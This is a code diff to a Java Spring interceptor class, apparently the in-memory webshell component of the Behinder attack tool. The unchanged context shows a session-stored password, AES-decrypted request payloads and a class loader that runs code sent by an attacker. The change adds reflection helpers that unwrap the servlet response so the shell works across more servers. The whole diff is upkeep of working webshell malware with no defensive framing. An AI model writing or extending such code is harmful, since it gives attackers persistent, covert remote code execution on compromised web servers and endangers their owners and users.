@@ -8,6 +8,7 @@ import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import javax.servlet.http.HttpSession;
+import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -40,7 +41,7 @@ public class BehinderInterceptor extends ClassLoader implements AsyncHandlerInte
                 HttpSession session = request.getSession();
                 Map<String, Object> obj = new HashMap<String, Object>(3);
                 obj.put("request", request);
-                obj.put("response", response);
+                obj.put("response", getInternalResponse(response));
                 obj.put("session", session);
                 session.setAttribute("u", this.pass);
                 Cipher c = Cipher.getInstance("AES");
@@ -54,6 +55,36 @@ public class BehinderInterceptor extends ClassLoader implements AsyncHandlerInte
             return false;
         } else {
             return true;
+        }
+    }
+
+    public HttpServletResponse getInternalResponse(HttpServletResponse response) {
+        while (true) {
+            try {
+                response = (HttpServletResponse) getFieldValue(response, "response");
+            } catch (Exception e) {
+                return response;
+            }
+        }
+    }
+
+    @SuppressWarnings("all")
+    public static Object getFieldValue(Object obj, String name) throws Exception {
+        Field field = null;
+        Class<?> clazz = obj.getClass();
+        while (clazz != Object.class) {
+            try {
+                field = clazz.getDeclaredField(name);
+                break;
+            } catch (NoSuchFieldException var5) {
+                clazz = clazz.getSuperclass();
+            }
+        }
+        if (field == null) {
+            throw new NoSuchFieldException(name);
+        } else {
+            field.setAccessible(true);
+            return field.get(obj);
         }
     }
 
